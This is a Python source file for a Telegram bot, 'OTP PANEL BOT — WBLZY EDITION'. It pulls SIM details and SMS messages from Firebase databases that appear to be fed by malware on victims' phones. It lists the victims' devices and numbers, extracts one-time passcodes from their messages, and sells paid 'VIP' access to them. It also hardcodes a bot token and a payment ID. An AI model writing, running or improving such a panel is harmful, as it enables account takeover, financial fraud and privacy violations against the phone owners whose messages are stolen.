#!/usr/bin/env python3
"""
OTP PANEL BOT — WBLZY EDITION
"""

import os, re, time, json, asyncio, logging, threading
from datetime import datetime
from flask import Flask, jsonify
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
import aiohttp

# ============ CONFIG ============
BOT_TOKEN = "8968617865:AAF1D2_1si8tZ_sOdLWklEomqs-oImVLcMw"
ADMIN_IDS = [7194867487, 5947360149]
UPI_ID = "anand.abhishek.deal@fam"
BOT_USERNAME = "Wblzy9Bot"
PORT = 8080

# ============ FLASK ============
app = Flask(__name__)
@app.route('/')
@app.route('/health')
def health():
    return jsonify({"status": "OK", "bot": "Wblzy9Bot"})

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

# ============ BOT SETUP ============
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

DATABASES = {}
all_users = {}
pending_action = {}
GLOBAL_DEVICE_CACHE = {}
DB_FILE = "bot_database.json"
_http_session = None

VIP_PLANS = {
    "2hr": {"name": "2 Hours", "price": 49, "duration": 7200},
    "1day": {"name": "1 Day", "price": 129, "duration": 86400},
    "1week": {"name": "1 Week", "price": 299, "duration": 604800},
}

# ============ HELPERS ============
def save_data():
    try:
        with open(DB_FILE, "w") as f:
            json.dump({"all_users": all_users, "DATABASES": DATABASES}, f)
    except:
        pass

def load_data():
    global all_users, DATABASES
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                all_users = {int(k): v for k, v in data.get("all_users", {}).items()}
                DATABASES.update(data.get("DATABASES", {}))
        except:
            pass

def is_vip(user_id):
    if user_id in ADMIN_IDS:
        return True
    return time.time() < all_users.get(user_id, {}).get("vip_until", 0)

async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        _http_session = aiohttp.ClientSession()
    return _http_session

async def fb_get(path, base):
    try:
        session = await get_http_session()
        async with session.get(f"{base}/{path}.json", timeout=5) as r:
            if r.status == 200:
                return await r.json()
    except:
        pass
    return None

def extract_numbers(data):
    if not isinstance(data, dict):
        return []
    nums = []
    for k in ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo"]:
        val = str(data.get(k, ""))
        cleaned = re.sub(r"\D", "", val)
        if cleaned.startswith("91") and len(cleaned) == 12:
            cleaned = cleaned[2:]
        if cleaned and len(cleaned) >= 5 and cleaned not in nums:
            nums.append(cleaned)
    return nums

def extract_otp(text):
    for pat in [re.compile(r"OTP[^\d]*(\d{4,8})", re.I), re.compile(r"\b(\d{6})\b"), re.compile(r"\b(\d{4})\b")]:
        m = pat.search(str(text))
        if m:
            return m.group(1)
    return None

# ============ KEYBOARDS ============
def get_main_menu(is_admin):
    keys = [
        ["🟢 Active Online", "📱 Devices List"],
        ["🔍 Search Number", "🔑 Recent OTPs"],
        ["👑 Buy VIP"],
        ["👤 My Profile", "💸 Refer & Earn"]
    ]
    if is_admin:
        keys.append(["🛡 Admin Panel", "📊 Bot Status"])
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def get_admin_panel():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
        [InlineKeyboardButton("➕ Add DB", callback_data="admin_add_firebase")],
        [InlineKeyboardButton("📋 List DBs", callback_data="admin_list_dbs")],
        [InlineKeyboardButton("🗑 Delete DBs", callback_data="admin_delete_dbs")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"), 
         InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

def get_vip_plans():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("⏱ 2 Hours — ₹49", callback_data="buy_vip:2hr")],
        [InlineKeyboardButton("📅 1 Day — ₹129", callback_data="buy_vip:1day")],
        [InlineKeyboardButton("🗓 1 Week — ₹299", callback_data="buy_vip:1week")],
        [InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]
    ])

def device_list_keyboard(devices, page=0):
    PAGE_SIZE = 10
    total = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page = max(0, min(page, total - 1))
    rows = []
    for d in devices[page * PAGE_SIZE:(page + 1) * PAGE_SIZE]:
        status = "🟢" if d.get("status") == "online" else "🔴"
        label = " & ".join(d.get("numbers", [])) or d.get("name", "Device")
        rows.append([InlineKeyboardButton(f"{status} {label}", callback_data=f"sel:{d['id']}")])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("◀️", callback_data=f"pg:{page-1}"))
    nav.append(InlineKeyboardButton(f"{page+1}/{total}", callback_data="noop"))
    if page < total - 1:
        nav.append(InlineKeyboardButton("▶️", callback_data=f"pg:{page+1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices"), 
                 InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def device_action_keyboard(dev_id, numbers):
    rows = []
    if numbers:
        rows.append([InlineKeyboardButton(f"📱 Copy: {numbers[0]}", callback_data=f"cp:{numbers[0]}")])
    rows.append([InlineKeyboardButton("📩 SMS", callback_data=f"msgs:{dev_id}"), 
                 InlineKeyboardButton("ℹ️ Info", callback_data=f"info:{dev_id}")])
    rows.append([InlineKeyboardButton("🔙 Back", callback_data="back_devices")])
    return InlineKeyboardMarkup(rows)

# ============ FETCH DEVICES ============
async def fetch_devices(tag, url):
    devices = []
    try:
        sim = await fb_get("All_Users/simDetails", url) or {}
        user_data = await fb_get("user_data", url) or {}
        for dev_id in set(sim.keys()) | set(user_data.keys()):
            nums = []
            name = "Device"
            status = "offline"
            if dev_id in user_data:
                data = user_data[dev_id]
                nums.extend(extract_numbers(data))
                name = data.get("d_name") or name
                if data.get("status") in (True, "online", "active"):
                    status = "online"
            if dev_id in sim:
                data = sim[dev_id]
                nums.extend(extract_numbers(data))
            if nums:
                devices.append({"id": dev_id, "name": name, "status": status, "numbers": nums, "base_url": url})
    except:
        pass
    return devices

async def get_all_devices():
    all_devices = []
    for tag, url in DATABASES.items():
        if tag not in GLOBAL_DEVICE_CACHE:
            GLOBAL_DEVICE_CACHE[tag] = await fetch_devices(tag, url)
        all_devices.extend(GLOBAL_DEVICE_CACHE[tag])
    unique = {}
    for d in all_devices:
        if d["id"] not in unique:
            unique[d["id"]] = d
    return sorted(unique.values(), key=lambda x: 0 if x["status"] == "online" else 1)

# ============ HANDLERS ============
@dp.message_handler(commands=['start'])
async def start(message: Message):
    cid = message.chat.id
    if cid not in all_users:
        all_users[cid] = {"name": message.from_user.full_name, "vip_until": 0}
        save_data()
    await message.reply("✨ WBLZY OTP PANEL\n━━━━━━━━━━━\nWelcome!", reply_markup=get_main_menu(cid in ADMIN_IDS))

@dp.message_handler(commands=['sendvip'])
async def send_vip(message: Message):
    if message.chat.id not in ADMIN_IDS:
        return await message.reply("🚫 Admin only")
    args = message.get_args().split()
    if len(args) < 1:
        return await message.reply("❌ /sendvip <user_id> [days]")
    try:
        target = int(args[0])
        days = int(args[1]) if len(args) > 1 else 1
        if target not in all_users:
            all_users[target] = {"name": "User", "vip_until": 0}
        all_users[target]["vip_until"] = time.time() + days * 86400
        save_data()
        await message.reply(f"✅ VIP given to {target} for {days} days!")
    except:
        await message.reply("❌ Error")

@dp.message_handler(commands=['adddb'])
async def add_db(message: Message):
    if message.chat.id not in ADMIN_IDS:
        return await message.reply("🚫 Admin only")
    args = message.get_args().split("|")
    if len(args) == 2:
        name, url = args[0].strip(), args[1].strip()
        DATABASES[name] = url
        save_data()
        await message.reply(f"✅ DB '{name}' added!")
    else:
        await message.reply("❌ /adddb Name | URL")

@dp.callback_query_handler(lambda c: True)
async def callback(query: CallbackQuery):
    data = query.data
    cid = query.message.chat.id
    is_admin = cid in ADMIN_IDS

    if data == "noop":
        return await query.answer()
    if data == "close_msg":
        return await query.message.delete()

    # Admin
    if data == "admin_add_firebase" and is_admin:
        pending_action[cid] = {"action": "add_db"}
        await query.message.reply("Send: Name | URL")
        return await query.answer()
    if data == "admin_list_dbs" and is_admin:
        txt = "📋 DATABASES\n━━━━━━━\n" + "\n".join([f"• {k}" for k in DATABASES]) if DATABASES else "No DBs"
        await query.message.edit_text(txt, reply_markup=get_admin_panel())
        return await query.answer()
    if data == "admin_delete_dbs" and is_admin:
        DATABASES.clear()
        save_data()
        await query.message.edit_text("🗑 Deleted!", reply_markup=get_admin_panel())
        return await query.answer()
    if data == "admin_refresh":
        await query.message.edit_text("🛡 Admin Panel", reply_markup=get_admin_panel())
        return await query.answer()
    if data == "admin_broadcast" and is_admin:
        pending_action[cid] = {"action": "broadcast"}
        await query.message.reply("Send broadcast message:")
        return await query.answer()

    if data == "refresh_devices" or data == "back_devices":
        GLOBAL_DEVICE_CACHE.clear()
        devices = await get_all_devices()
        if devices:
            await query.message.edit_text(f"📱 DEVICES ({len(devices)})", reply_markup=device_list_keyboard(devices))
        else:
            await query.message.edit_text("❌ No devices")
        return await query.answer()

    if data.startswith("pg:"):
        page = int(data.split(":")[1])
        devices = await get_all_devices()
        await query.message.edit_text(f"📱 DEVICES ({len(devices)})", reply_markup=device_list_keyboard(devices, page))
        return await query.answer()

    if data.startswith("sel:"):
        dev_id = data.split(":")[1]
        devices = await get_all_devices()
        device = next((d for d in devices if d["id"] == dev_id), None)
        if device:
            user_focus[cid] = dev_id
            await query.message.edit_text(
                f"📡 {device['name']}\n📱 {' & '.join(device['numbers'])}\n⚡ {device['status']}",
                reply_markup=device_action_keyboard(dev_id, device["numbers"])
            )
        return await query.answer()

    if data.startswith("msgs:"):
        dev_id = data.split(":")[1]
        devices = await get_all_devices()
        device = next((d for d in devices if d["id"] == dev_id), None)
        if device:
            sms_data = await fb_get(f"All_Users/sms/{dev_id}", device["base_url"])
            if sms_data and isinstance(sms_data, dict):
                txt = "📩 MESSAGES\n━━━━━━━\n"
                for k, sms in list(sms_data.items())[:5]:
                    if isinstance(sms, dict):
                        body = sms.get("body") or ""
                        otp = extract_otp(body)
                        txt += f"{sms.get('sender', 'Unknown')}\n"
                        if otp:
                            txt += f"🔑 OTP: {otp}\n"
                        txt += f"💬 {body[:50]}\n━━━━━━━\n"
                await query.message.edit_text(txt, reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")]
                ]))
            else:
                await query.answer("📭 No messages")
        return await query.answer()

    if data.startswith("info:"):
        dev_id = data.split(":")[1]
        devices = await get_all_devices()
        device = next((d for d in devices if d["id"] == dev_id), None)
        if device:
            await query.message.edit_text(
                f"ℹ️ ID: {device['id']}\n📱 {', '.join(device['numbers'])}\n📛 {device['name']}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")]])
            )
        return await query.answer()

    # VIP Purchase
    if data.startswith("buy_vip:"):
        plan = data.split(":")[1]
        if plan in VIP_PLANS:
            p = VIP_PLANS[plan]
            pending_action[cid] = {"action": "payment", "plan": plan}
            await query.message.delete()
            await bot.send_photo(cid, f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi://pay?pa={UPI_ID}&am={p['price']}&cu=INR",
                caption=f"Pay ₹{p['price']} to {UPI_ID}\nSend screenshot")
        return await query.answer()

    if not is_vip(cid):
        await query.message.reply("🚫 VIP Required!")
        return await query.answer()

    await query.answer()

@dp.message_handler()
async def handle_message(message: Message):
    cid = message.chat.id
    text = message.text or ""
    is_admin = cid in ADMIN_IDS

    # Pending actions
    if cid in pending_action:
        action = pending_action[cid].get("action")
        if action == "add_db" and is_admin:
            parts = text.split("|")
            if len(parts) == 2:
                DATABASES[parts[0].strip()] = parts[1].strip()
                save_data()
                await message.reply("✅ DB added!")
            pending_action.pop(cid)
            return
        if action == "broadcast" and is_admin:
            count = 0
            for uid in all_users:
                try:
                    await message.copy_to(uid)
                    count += 1
                except:
                    pass
            await message.reply(f"✅ Sent to {count} users!")
            pending_action.pop(cid)
            return
        if action == "payment" and message.photo:
            for admin in ADMIN_IDS:
                await bot.send_photo(admin, message.photo[-1].file_id,
                    caption=f"💳 Payment from {message.from_user.full_name}\n🆔 {cid}\n📦 {pending_action[cid].get('plan')}")
            await message.reply("✅ Sent to admin!")
            pending_action.pop(cid)
            return

    # Menu
    if text == "👑 Buy VIP":
        await message.reply("VIP PLANS", reply_markup=get_vip_plans())
        return
    if text == "👤 My Profile":
        u = all_users.get(cid, {})
        vip = "Active" if is_vip(cid) else "Inactive"
        await message.reply(f"👤 {u.get('name', 'User')}\n🆔 {cid}\n👑 VIP: {vip}")
        return
    if text == "💸 Refer & Earn":
        await message.reply(f"https://t.me/{BOT_USERNAME}?start={cid}")
        return
    if text == "🛡 Admin Panel" and is_admin:
        await message.reply("🛡 Admin", reply_markup=get_admin_panel())
        return
    if text == "📊 Bot Status" and is_admin:
        await message.reply(f"👥 {len(all_users)}\n🗄 {len(DATABASES)}\n📱 {len(GLOBAL_DEVICE_CACHE)}")
        return

    if not is_vip(cid):
        await message.reply("🚫 VIP Required!")
        return

    if text == "🟢 Active Online":
        devices = await get_all_devices()
        online = [d for d in devices if d["status"] == "online"]
        await message.reply(f"🟢 Online: {len(online)}\n" + "\n".join([f"• {' & '.join(d['numbers'])}" for d in online[:10]]))
        return

    if text == "📱 Devices List":
        devices = await get_all_devices()
        if not devices:
            await message.reply("❌ No devices. Add DB via Admin.")
            return
        await message.reply(f"📱 {len(devices)} devices", reply_markup=device_list_keyboard(devices))
        return

    if text == "🔍 Search Number":
        pending_action[cid] = {"action": "search"}
        await message.reply("Send number:")
        return

    if text == "🔑 Recent OTPs":
        devices = await get_all_devices()
        found = []
        for d in devices[:5]:
            sms = await fb_get(f"All_Users/sms/{d['id']}", d["base_url"])
            if sms and isinstance(sms, dict):
                for s in list(sms.values())[:3]:
                    if isinstance(s, dict):
                        otp = extract_otp(s.get("body", ""))
                        if otp:
                            found.append(f"{otp} - {' & '.join(d['numbers'])}")
        await message.reply("🔑 OTPs\n━━━━━\n" + "\n".join(found[:10]) if found else "No OTPs")
        return

    if pending_action.get(cid, {}).get("action") == "search":
        pending_action.pop(cid)
        query = re.sub(r"\D", "", text)
        devices = await get_all_devices()
        matched = [d for d in devices if any(query in re.sub(r"\D", "", n) for n in d["numbers"])]
        if matched:
            await message.reply("\n".join([f"• {' & '.join(d['numbers'])}" for d in matched[:10]]))
        else:
            await message.reply("❌ Not found")

# ============ POLLING ============
async def poll_loop():
    while True:
        try:
            for tag, url in DATABASES.items():
                GLOBAL_DEVICE_CACHE[tag] = await fetch_devices(tag, url)
        except:
            pass
        await asyncio.sleep(2)

# ============ MAIN ============
if __name__ == "__main__":
    load_data()
    threading.Thread(target=run_flask, daemon=True).start()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(poll_loop())
    print("🚀 Bot Started!")
    executor.start_polling(dp, skip_updates=True)